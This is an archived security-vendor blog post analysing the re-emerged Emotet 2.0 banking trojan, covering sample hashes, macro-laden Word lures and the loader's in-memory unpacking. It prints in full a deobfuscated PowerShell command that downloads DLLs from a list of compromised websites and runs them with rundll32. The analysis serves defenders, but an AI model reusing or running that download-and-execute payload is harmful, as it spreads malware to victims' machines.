                <div id="wm-capinfo-collected-by">
    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center">COLLECTED BY</div>
    <div style="padding:3px;position:relative" id="wm-collected-by-content">
            <div style="display:inline-block;vertical-align:top;width:50%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/archiveteam);"></span>
		Organization: <a style="color:#33f;" href="https://archive.org/details/archiveteam" target="_new"><span class="wm-title">Archive Team</span></a>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  <img align=right src="http://archiveteam.org/images/e/e6/Archiveteam.jpg" width=200> Formed in 2009, the Archive Team (not to be confused with the archive.org Archive-It Team) is a rogue archivist collective dedicated to saving copies of rapidly dying or deleted websites for the sake of history and digital heritage. The group is 100% composed of volunteers and interested parties, and has expanded into a large amount of related projects for saving online and digital history.
<p>
History is littered with hundreds of conflicts over the future of a community, group, location or business that were "resolved" when one of the parties stepped ahead and destroyed what was there. With the original point of contention destroyed, the debates would fall to the wayside. Archive Team believes that by duplicated condemned data, the conversation and debate can continue, as well as the richness and insight gained by keeping the materials. Our projects have ranged in size from a single volunteer downloading the data to a small-but-critical site, to over 100 volunteers stepping forward to acquire terabytes of user-created data to save for future generations.
<p>
The main site for Archive Team is at <a href="http://www.archiveteam.org">archiveteam.org</a> and contains up to the date information on various projects, manifestos, plans and walkthroughs.
<p>
This collection contains the output of many Archive Team projects, both ongoing and completed. Thanks to the generous providing of disk space by the Internet Archive, multi-terabyte datasets can be made available, as well as in use by the <a href="http://archive.org/web/web.php">Wayback Machine</a>, providing a path back to lost websites and work. 
<p>
Our collection has grown to the point of having sub-collections for the type of data we acquire. If you are seeking to browse the contents of these collections, the Wayback Machine is the best first stop. Otherwise, you are free to dig into the stacks to see what you may find.
<p>
<b>The Archive Team Panic Downloads</b> are full pulldowns of currently extant websites, meant to serve as emergency backups for needed sites that are in danger of closing, or which will be missed dearly if suddenly lost due to hard drive crashes or server failures. 
<p>
	</div>

			<span class="c-logo" style="background-image:url(https://archive.org/services/img/archiveteam_urls)"></span>
		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/archiveteam_urls" target="_new"><span class="wm-title">Archive Team: URLs</span></a></div>

<header class="entry-header">
<h1 class="entry-title">Emotet 2.0: Everything you need to know about the new Variant of the Banking Trojan</h1> <div class="entry-meta">
<span class="byline"> by <span class="author vcard"><a class="url fn n" href="https://web.archive.org/web/20211223100528/https://cloudsek.com/author/anadeshwar-unnikrishnan/">Anandeshwar Unnikrishnan</a></span></span> </div>
</header>
<main id="primary" class="site-main">
<article id="post-18619" class="post-18619 post type-post status-publish format-standard has-post-thumbnail hentry category-tech">
<div class="post-thumbnail">
<img width="800" height="600" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20600'%3E%3C/svg%3E" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="Everything You Need to Know About the New Variant of the Notorious Banking Trojan" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan.png 800w, //cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan-300x225.png 300w, //cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan-768x576.png 768w, //cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan-150x113.png 150w" data-lazy-sizes="(max-width: 800px) 100vw, 800px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan.png" data-pagespeed-url-hash="1476659595" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="800" height="600" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="Everything You Need to Know About the New Variant of the Notorious Banking Trojan" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan.png 800w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/xEmotet-2-blog-banking-trojan-300x225.png.pagespeed.ic.QImjCatodL.jpg 300w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan-768x576.png 768w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/Emotet-2-blog-banking-trojan-150x113.png 150w" sizes="(max-width: 800px) 100vw, 800px" data-pagespeed-url-hash="150786469"/></noscript> </div>
<div class="entry-content clearfix">
<p></p>
<p>Since it was first identified in 2014, the Emotet banking trojan has been a persistent threat that has affected over 1.6 million computers and led to millions of dollars in loss. However, in January 2021 a collaborative effort between law enforcement in several countries, coordinated by <a href="https://web.archive.org/web/20211223100528/https://www.europol.europa.eu/media-press/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action" target="_blank" rel="noreferrer noopener" title="https://www.europol.europa.eu/media-press/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action">Europol</a> and Eurojust, dismantled the operations of Emotet, which was followed by several arrests in Ukraine. </p>
<p></p>
<p></p>
<p>Despite the disruptions in their operations, within 9 months, in November 2021, new Emotet samples were discovered in the wild. Though the new variant of Emotet is very similar to the previous bot code, it differs in the encryption scheme used for command and control communications.&nbsp;</p>
<p></p>
<p></p>
<p>In this article, we delve into the technical aspects of the re-emerged Emotet malware dubbed Emotet 2.0.&nbsp;</p>
<p></p>
<p></p>
<p><strong>Analyzed Samples</strong></p>
<p></p>
<p></p>
<p>Emotet 2.0 has been analyzed based on the following samples:</p>
<p></p>
<p></p>
<p><strong>Documents:</strong></p>
<p></p>
<p></p>
<ul>
<li>349d13ca99ab03869548d75b99e5a1d0</li>
<li>eb02f3635fbe19caf518a59aceb753ed</li>
</ul>
<p></p>
<p></p>
<p><strong>PE Images:</strong></p>
<p></p>
<p></p>
<ul>
<li>4b957e4473826a37066f4489f5abbed4 </li>
</ul>
<p></p>
<p></p>
<h3>Initial Access</h3>
<p></p>
<p></p>
<p>After almost a year-long hiatus, the Emotet malware has returned to the threat landscape through spamming campaigns. Adversaries are using weaponized Microsoft Word document files to spread the infection.&nbsp;</p>
<p></p>
<p></p>
<p>As shown in the image below, users are tricked into clicking “Enable Content” to execute the malicious Macros that downloads Emotet malware hosted on various WordPress websites compromised by the attackers.</p>
<p></p>
<p></p>
<p></p>
<p></p>
<figure class="wp-block-image size-large"><img width="1024" height="490" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20490'%3E%3C/svg%3E" alt="" class="wp-image-18621" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-1024x490.png 1024w, //cloudsek.com/wp-content/uploads/2021/12/image10-1-300x143.png 300w, //cloudsek.com/wp-content/uploads/2021/12/image10-1-768x367.png 768w, //cloudsek.com/wp-content/uploads/2021/12/image10-1-150x72.png 150w, //cloudsek.com/wp-content/uploads/2021/12/image10-1.png 1192w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-1024x490.png" data-pagespeed-url-hash="335886847" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="1024" height="490" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-1024x490.png" alt="" class="wp-image-18621" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-1024x490.png 1024w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-300x143.png 300w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-768x367.png 768w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image10-1-150x72.png 150w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image10-1.png 1192w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="689981684"/></noscript><figcaption><em>Malicious Macros used to download Emotet</em></figcaption></figure>
<p></p>
<p></p>
<p></p>
<p></p>
<p>Having extracted the malicious Macros embedded in the document, we found that:</p>
<p></p>
<p></p>
<ul>
<li>The Macros are heavily obfuscated to hinder the analysis. </li>
<li>After deobfuscation, we observed that the Macros execute the Powershell command on the victim system to fetch the Emotet payload from the attacker&#8217;s <a href="https://web.archive.org/web/20211223100528/https://cloudsek.com/whitepapers_reports/abysmal-state-of-global-critical-infrastructure-security/" target="_blank" rel="noreferrer noopener" title="Abysmal Infrastructure">infrastructure</a>. </li>
<li>After analyzing multiple files, we observed that the campaign uses different PE image files, like executable and DLLs (Dynamic-link libraries), to spread the malware.</li>
<li>While some campaigns leverage DLL files to deploy the malware, others use .exe files to deploy it. </li>
</ul>
<p></p>
<p></p>
<p></p>
<p></p>
<figure class="wp-block-image size-large"><img width="1024" height="640" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20640'%3E%3C/svg%3E" alt="" class="wp-image-18623" data-lazy-srcset="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-1024x640.png 1024w, //cloudsek.com/wp-content/uploads/2021/12/image11-2-300x187.png 300w, //cloudsek.com/wp-content/uploads/2021/12/image11-2-768x480.png 768w, //cloudsek.com/wp-content/uploads/2021/12/image11-2-150x94.png 150w, //cloudsek.com/wp-content/uploads/2021/12/image11-2.png 1289w" data-lazy-sizes="(max-width: 1024px) 100vw, 1024px" data-lazy-src="//web.archive.org/web/20211223100528/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-1024x640.png" data-pagespeed-url-hash="3879658218" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img width="1024" height="640" src="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-1024x640.png" alt="" class="wp-image-18623" srcset="//web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-1024x640.png 1024w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-300x187.png 300w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-768x480.png 768w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image11-2-150x94.png 150w, //web.archive.org/web/20211223100528im_/https://cloudsek.com/wp-content/uploads/2021/12/image11-2.png 1289w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="345520037"/></noscript><figcaption><em>The malicious Macros extracted from the document</em></figcaption></figure>
<p></p>
<p></p>
<p></p>
<p></p>
<p>The images below illustrate the different Powershell payloads from multiple malicious documents:</p>
<p></p>
<p></p>
<ol>
<li>Powershell payload that downloads DLL files</li>
</ol>
<p></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><strong>powershell </strong><strong>$dfkj</strong><strong>=</strong><strong>&#8220;</strong><strong>$strs</strong><strong>=\&#8221;</strong><strong>http://toupai80.com/wp-admin/C7TNEk/,http://phpnan.com/rajaship/AGV4lxu7XvcyjjvIZ29g/,http://alfadandoinc.com/</strong><strong>67</strong><strong>oyp/m55JgEVxA1SYr3dXpEJw/,http://www.caboturnup.com/wp-content/plugins/classic-editor/js/yuOeppNKhbJiW/,http://comtamutthang.com/wp-content/uploads/</strong><strong>5</strong><strong>U4OLMs/,http://ec2-</strong><strong>54</strong><strong>&#8211;</strong><strong>206</strong><strong>&#8211;</strong><strong>92</strong><strong>&#8211;</strong><strong>66</strong><strong>.ap-southeast-</strong><strong>2</strong><strong>.compute.amazonaws.com/licenses/yB2dXUFf3YYI9uAg/,http://riven3.online/wp-content/SFTwXTjrYTM/\</strong><strong>&#8220;.Split(\&#8221;</strong><strong>,\</strong><strong>&#8220;);foreach(</strong><strong>$st</strong><strong> in </strong><strong>$strs</strong><strong>){</strong><strong>$r1</strong><strong>=Get-Random;</strong><strong>$r2</strong><strong>=Get-Random;</strong><strong>$tpth</strong><strong>=\&#8221;</strong><strong>c:\programdata\\\</strong><strong>&#8220;+</strong><strong>$r1</strong><strong>+\&#8221;</strong><strong>.dll\</strong><strong>&#8220;;Invoke-WebRequest -Uri </strong><strong>$st</strong><strong> -OutFile </strong><strong>$tpth</strong><strong>;if(Test-Path </strong><strong>$tpth</strong><strong>){</strong><strong>$fp</strong><strong>=\&#8221;</strong><strong>c:\windows\syswow64\rundll32.exe\</strong><strong>&#8220;;</strong><strong>$a</strong><strong>=</strong><strong>$tpth</strong><strong>+\&#8221;</strong><strong>,f\</strong><strong>&#8220;+</strong><strong>$r2</strong><strong>;Start-Process </strong><strong>$fp</strong><strong> -ArgumentList </strong><strong>$a</strong><strong>;break;}};&#8221;</strong><strong>;IEX </strong><strong>$dfkj</strong></td>
</tr>
</tbody>
</table>
</figure>
<p></p>
<p></p>
<p>When the payload is DLL, the campaign uses <strong>Rundll32</strong> to execute an exported function <strong><em>Control_RunDLL</em></strong> to deploy the Emotet payload.</p>
<p></p>
<p></p>
<p></p>
<p></p>

<p></p>
<p></p>
<p>When the payload is a .exe executable file, the Powershell payload fetches the .exe file from the attacker’s infrastructure and executes on the victim’s system.</p>
<p></p>
<p></p>
<h3>Emotet Malware Payload</h3>
<p></p>
<p></p>
<ul>
<li>The Win32API <strong><em>IsProcessorFeaturePresent</em></strong> is commonly used in malware for anti-debug purposes.&nbsp;</li>
<li>The argument value 0xA is passed to the API to check if the SSE2 instruction set is available on the victim system. Here, 0xA represents the constant value:&nbsp; <strong>PF_XMMI64_INSTRUCTIONS_AVAILABLE</strong>.</li>
<li>&nbsp;Systems that support the SSE2 instruction set can use special registers <strong>xmmn,</strong> where <strong>n</strong> can have values from 0 — 7.&nbsp;</li>
<li>Later in the process the malware uses <strong>xmmn</strong> registers to transfer data.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh4.googleusercontent.com/q1QBD5vx2rnGaeOBmc4MEHzHdWW8RuFbd_lBuyeRqn9eOFIHrcXQ8JCzVPYwsBPH93A4zhAvkmKTg90ti6NWTTuUwGrm35J848dAnQIJk_zHYtKJrct09CbKcrj_rL-7FbBVibBU" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh4.googleusercontent.com/q1QBD5vx2rnGaeOBmc4MEHzHdWW8RuFbd_lBuyeRqn9eOFIHrcXQ8JCzVPYwsBPH93A4zhAvkmKTg90ti6NWTTuUwGrm35J848dAnQIJk_zHYtKJrct09CbKcrj_rL-7FbBVibBU" alt="" data-pagespeed-url-hash="3469693125"/></noscript></figure>
<p></p>
<p></p>
<h4>Loading Mechanism</h4>
<p></p>
<p></p>
<ul>
<li>The DLL/exe file dropped by the malicious document acts as a dropper to deploy the Emotet malware. The analyzed DLL has a PE image hidden inside it as shown in the image below:</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh5.googleusercontent.com/rjmKnrSS-Ja3grsdd8kZLvx50VuaFc1wWQ8b72mp01mX6lOCMQf9y_unFjtH1hRw-rTUES9wcZiGKlI6F1-22Kt8LtdkdDApGprD8rcjCJdWOMw5tCDagu5knnYnpH5LherxpAFD" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh5.googleusercontent.com/rjmKnrSS-Ja3grsdd8kZLvx50VuaFc1wWQ8b72mp01mX6lOCMQf9y_unFjtH1hRw-rTUES9wcZiGKlI6F1-22Kt8LtdkdDApGprD8rcjCJdWOMw5tCDagu5knnYnpH5LherxpAFD" alt="" data-pagespeed-url-hash="3627493949"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>Here, the malware uses the SSE2 instruction set for data transfer, i.e. the <strong>xmmn</strong> registers transfer hidden payload bytes within the malware.&nbsp;</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh5.googleusercontent.com/YadR6m0dqWiuTgDbLCUnI2VqM7lwoB-Mvl9jMmWGdTClOc6IEP71suNWZxKcJApyCkaUzckaL1fkunBhrLEmzq4M5Q1GR8tSSVUK0mXWHvVnR3zcggvhjhT3Llt5YvmQ08cxlm6E" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh5.googleusercontent.com/YadR6m0dqWiuTgDbLCUnI2VqM7lwoB-Mvl9jMmWGdTClOc6IEP71suNWZxKcJApyCkaUzckaL1fkunBhrLEmzq4M5Q1GR8tSSVUK0mXWHvVnR3zcggvhjhT3Llt5YvmQ08cxlm6E" alt="" data-pagespeed-url-hash="535866828"/></noscript></figure>
<p></p>
<p></p>
<p><em>The code responsible for transferring hidden payload bytes within the malware</em></p>
<p></p>
<p></p>
<ul>
<li>The malware then allocates memory to dump the hidden Emotet payload using VirtualAlloc Win32 api.&nbsp;</li>
<li>The argument 0x40 has a value of <strong>PAGE_EXECUTE_READWRITE, </strong>which sets the permission of the newly allocated memory to read, write, and execute.&nbsp;</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh3.googleusercontent.com/oqQh74jKwGRI3qwazXS-8mSC9EMYk24rOLNaOPaq2XlOut-RGseLqdKksCGqlQ-vyiqFEw5l7kgqSx41Jv9wYwsQ-Aa8N7Z03qBfdYinf1rUi8sZRVuWnG56CeSi3BLD9Q4AC8Gm" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh3.googleusercontent.com/oqQh74jKwGRI3qwazXS-8mSC9EMYk24rOLNaOPaq2XlOut-RGseLqdKksCGqlQ-vyiqFEw5l7kgqSx41Jv9wYwsQ-Aa8N7Z03qBfdYinf1rUi8sZRVuWnG56CeSi3BLD9Q4AC8Gm" alt="" data-pagespeed-url-hash="3359596030"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>The malware copies the hidden PE image into an address starting from 0x10000000. The address of the newly allocated memory can be found in the EAX register, as shown below:</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh5.googleusercontent.com/l0TWWTWG6n0QUpLlnwsf4tHsXg9QTi1tMLAxjYSoIDjDmpw6vW_MCTVdU30ElZBNb3R698-WfCzu-qZhEawfRHRtES3j3IiEs3WJDPVmHqTHSI89LBScBKFCWTBgmspv6kYES1gN" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh5.googleusercontent.com/l0TWWTWG6n0QUpLlnwsf4tHsXg9QTi1tMLAxjYSoIDjDmpw6vW_MCTVdU30ElZBNb3R698-WfCzu-qZhEawfRHRtES3j3IiEs3WJDPVmHqTHSI89LBScBKFCWTBgmspv6kYES1gN" alt="" data-pagespeed-url-hash="1789239648"/></noscript></figure>
<p></p>
<p></p>
<p>As seen in the image below, the memory permissions for the region 0x10000000 to 0x00028000 have been set to <strong>ERW</strong> (Execute, Read, Write).</p>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh5.googleusercontent.com/Bgdcb9PYcSLEf5gCs_9cKCS7Ecn3fWHuny2WbjkxusKr-onDQP1P8Sj3ZrEPEa2xWKLlh5C1MWejl59mrrMDSGHIaD7eLxhfZWv-JTaXC70S8RuLW4aF7sbwltjxZUnYKkPW4Csj" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh5.googleusercontent.com/Bgdcb9PYcSLEf5gCs_9cKCS7Ecn3fWHuny2WbjkxusKr-onDQP1P8Sj3ZrEPEa2xWKLlh5C1MWejl59mrrMDSGHIaD7eLxhfZWv-JTaXC70S8RuLW4aF7sbwltjxZUnYKkPW4Csj" alt="" data-pagespeed-url-hash="3333581998"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>The malware uses the code seen below, to copy the PE image, segment by segment, into the newly allocated memory with Execute, Read, Write permission.&nbsp;</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh3.googleusercontent.com/dFrhy0hyG-xDOx4x0fBzAjDSQLafjVs3IJ0fyi-3rR-NJYSnS5gCD_JZBsXjnO_8udr22oRvEHi596xNpeoLHBqVYs3-tIqjyy0DKZ76XmKEbQSBva19WW_nmb9YoMRLetVbkp_9" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh3.googleusercontent.com/dFrhy0hyG-xDOx4x0fBzAjDSQLafjVs3IJ0fyi-3rR-NJYSnS5gCD_JZBsXjnO_8udr22oRvEHi596xNpeoLHBqVYs3-tIqjyy0DKZ76XmKEbQSBva19WW_nmb9YoMRLetVbkp_9" alt="" data-pagespeed-url-hash="3464444069"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>After transfering the byte, the newly allocated memory has a PE image with its MZ header, and the segments are ready to be executed by the malware.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh4.googleusercontent.com/GuMeSXUAEUONif_SDSd8v7YWXf4UZml38LjzaJpRm6myjyHePNUCTLm6KeZPE968S-2d7FXUlR9OWGss6o-G_RYCKXVlWmawQKIqLFvUHPicx1WX_gOLRG2WTK4DyKx7LAKCv9j0" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh4.googleusercontent.com/GuMeSXUAEUONif_SDSd8v7YWXf4UZml38LjzaJpRm6myjyHePNUCTLm6KeZPE968S-2d7FXUlR9OWGss6o-G_RYCKXVlWmawQKIqLFvUHPicx1WX_gOLRG2WTK4DyKx7LAKCv9j0" alt="" data-pagespeed-url-hash="2363848756"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>The malware then transfers control to a hidden payload by calling the memory address 0x100143B3.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh6.googleusercontent.com/Sal2-EfBem8RpgL_f6NOKAWARlE6T6ewlonM8mbI9l897sr-TEkMJDST2KbMlqliDVuTetSXqaezbl4XCkCt00llogTu88stugTIMe8DxqH8iDPC_GLwCukGazrg4AmVhAJbmD35" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh6.googleusercontent.com/Sal2-EfBem8RpgL_f6NOKAWARlE6T6ewlonM8mbI9l897sr-TEkMJDST2KbMlqliDVuTetSXqaezbl4XCkCt00llogTu88stugTIMe8DxqH8iDPC_GLwCukGazrg4AmVhAJbmD35" alt="" data-pagespeed-url-hash="45944255"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>The image below shows the value stored in the Stack, when the above call happens. The execution starts from address 0x100143B3 in the newly allocated memory.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh4.googleusercontent.com/VG63uHWe8J2QEtdniQDodZe4D1VpUzkUUuirbDUtjC37CvfP3HLhRQoOJyaI7lHPjlg5S1szuoGDbZCSUWz8oFmjft2GfqBxNa7gGo1t7eX0oZMc1NWu9R2whibKVSbhIsUJJVml" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh4.googleusercontent.com/VG63uHWe8J2QEtdniQDodZe4D1VpUzkUUuirbDUtjC37CvfP3HLhRQoOJyaI7lHPjlg5S1szuoGDbZCSUWz8oFmjft2GfqBxNa7gGo1t7eX0oZMc1NWu9R2whibKVSbhIsUJJVml" alt="" data-pagespeed-url-hash="939781776"/></noscript></figure>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh4.googleusercontent.com/IuuxB0OobKdxfNfbWd31yxFa6QPu_0ejdbivPs2zzyOGne8zKLQaENaM5XcnVxIktgttJkknTELBjz7AOfzrOcZCQsbjrjVvkOjgjXmMhwnVEp6mwTNlMleU3kHoshNKK1q58Tr6" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh4.googleusercontent.com/IuuxB0OobKdxfNfbWd31yxFa6QPu_0ejdbivPs2zzyOGne8zKLQaENaM5XcnVxIktgttJkknTELBjz7AOfzrOcZCQsbjrjVvkOjgjXmMhwnVEp6mwTNlMleU3kHoshNKK1q58Tr6" alt="" data-pagespeed-url-hash="1728803438"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>Subsequently, the Emotet malware is executed. The shellcode is polymorphic in nature as each set of shellcode bytes are encoded by XORing with a key value to evade signature based detection as shown in the image below. The basic functionalities of the shellcode are covered in the System Wide Activity section.&nbsp;</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh4.googleusercontent.com/TZ4-ZKL20uazZuBcAIAUqOsQPnb5Y2GWHLkzHSWtdZrqzFtApN0DhBcLUCu_LtRrfOFH_wovQIJ4GM7p55pGRTOFuqQnxhl3qIzaYOPlnhTl8w9n9b0TeFzi1laLSYU9BgvQJ_JK" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh4.googleusercontent.com/TZ4-ZKL20uazZuBcAIAUqOsQPnb5Y2GWHLkzHSWtdZrqzFtApN0DhBcLUCu_LtRrfOFH_wovQIJ4GM7p55pGRTOFuqQnxhl3qIzaYOPlnhTl8w9n9b0TeFzi1laLSYU9BgvQJ_JK" alt="" data-pagespeed-url-hash="3145141241"/></noscript></figure>
<p></p>
<p></p>
<ul>
<li>Finally the Emotet shellcode exits from the system.</li>
</ul>
<p></p>
<p></p>
<figure class="wp-block-image"><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="" data-lazy-src="//web.archive.org/web/20211223100528/https://lh6.googleusercontent.com/rXYNZHYfV98ujjqaiPovekW3MHzEwmQFcUQejbe13bwjN5eRkZoB1T2VhcL-R63dymwOk6idWNEDCREI1wSox3jVObvkdOB0rz1k-lOCi0dAzN4tkHEXevjkE7JVfgDRqFzQJ6ek" data-pagespeed-url-hash="3435895109" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><noscript><img src="//web.archive.org/web/20211223100528im_/https://lh6.googleusercontent.com/rXYNZHYfV98ujjqaiPovekW3MHzEwmQFcUQejbe13bwjN5eRkZoB1T2VhcL-R63dymwOk6idWNEDCREI1wSox3jVObvkdOB0rz1k-lOCi0dAzN4tkHEXevjkE7JVfgDRqFzQJ6ek" alt="" data-pagespeed-url-hash="1186886174"/></noscript></figure>
<p></p>
<p></p>
